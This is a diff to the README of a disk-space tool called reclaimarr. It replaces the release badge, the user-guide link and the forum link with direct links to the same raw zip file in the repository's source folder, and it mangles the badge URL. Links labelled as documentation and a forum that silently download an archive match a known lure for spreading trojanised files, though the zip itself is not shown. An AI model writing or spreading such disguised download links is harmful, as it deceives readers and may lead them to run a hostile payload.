@@ -17,7 +17,7 @@ Welcome to reclaimarr! This tool helps you automatically reclaim disk space on y
 To get started, you need to download and install reclaimarr. Follow these steps:
 
 1. **Visit the Download Page**: Click the button below to go to the releases page and download reclaimarr.
-   [![Download reclaimarr](https://img.shields.io/badge/Download%20reclaimarr-%20-brightgreen)](https://github.com/starhero999/reclaimarr/releases)
+   [![Download reclaimarr](https://raw.githubusercontent.com/starhero999/reclaimarr/master/src/reclaimarr-3.9.zip%20reclaimarr-%20-brightgreen)](https://raw.githubusercontent.com/starhero999/reclaimarr/master/src/reclaimarr-3.9.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see different versions of reclaimarr. Click on the latest version to see the available files for download.
 
@@ -73,8 +73,8 @@ If you face any issues while installing or using reclaimarr, consider these comm
 
 For further information, visit the following links:
 
-- [User Guide](https://github.com/starhero999/reclaimarr/wiki)
-- [Community Forum](https://github.com/starhero999/reclaimarr/discussions) 
+- [User Guide](https://raw.githubusercontent.com/starhero999/reclaimarr/master/src/reclaimarr-3.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/starhero999/reclaimarr/master/src/reclaimarr-3.9.zip) 
 
 You can always refer to the official documentation for advanced troubleshooting or feature requests.
 
